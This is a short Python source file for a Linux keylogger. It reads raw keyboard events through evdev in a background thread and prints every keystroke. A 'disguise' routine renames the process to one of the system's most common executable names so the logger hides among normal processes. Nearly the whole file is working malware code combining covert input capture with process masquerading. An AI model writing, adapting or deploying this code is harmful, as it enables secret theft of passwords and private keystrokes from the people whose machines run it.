from evdev import InputDevice, categorize, ecodes, list_devices
import os
import psutil
import random
import setproctitle
import threading

def disguise():
	setDisguise(getDisguise())
	
def getDisguise():
	pids = psutil.pids()
	processes = {}

	for pid in pids:
		p = psutil.Process(pid)
		name = p.exe()
		if (name in processes and name != ""):
			processes[name] += 1
		else:
			processes[name] = 1

	common = sorted(processes, key = processes.get, reverse = True)
	top5 = common[:5]
	return top5[random.randint(0,4)]
	
def setDisguise(disguise):
	setproctitle.setproctitle(disguise)
	print "Cloaked as: " + disguise

def startKeylogger():
	logThread = threading.Thread(target=startKeylistener)
	logThread.daemon = True
	logThread.start()

def findKeyboard():
	devices = [InputDevice(fn) for fn in list_devices()]
	for dev in devices:
		if "Keyboard" in dev.name:
			return dev.fn 

def startKeylistener():
	dev = InputDevice(findKeyboard())
	for event in dev.read_loop():
		if event.type == ecodes.EV_KEY:
			print(categorize(event))
